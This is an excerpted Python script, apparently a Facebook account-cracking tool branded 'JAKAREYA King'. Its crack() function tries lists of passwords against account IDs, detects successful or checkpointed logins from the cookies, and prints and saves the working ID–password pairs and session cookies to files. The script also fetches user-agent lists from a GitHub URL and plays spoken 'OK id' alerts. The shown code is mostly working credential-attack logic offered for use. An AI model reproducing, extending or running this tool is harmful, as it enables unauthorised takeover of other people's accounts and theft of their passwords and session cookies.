...
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/736869400285077/')
#------------------[ jakareya-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/Jakareya420.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Jakareya420.txt').text
        ua=open('bbnew.txt','w')
...
╠══[Github                   • \33[1;38mJakareya-420]\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  JAKAREYA,  King,  Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[JAKAREYA•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[JAKAREYA-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " JAKAREYA,  Ok,  id"')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " Ok,  JAKAREYA,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
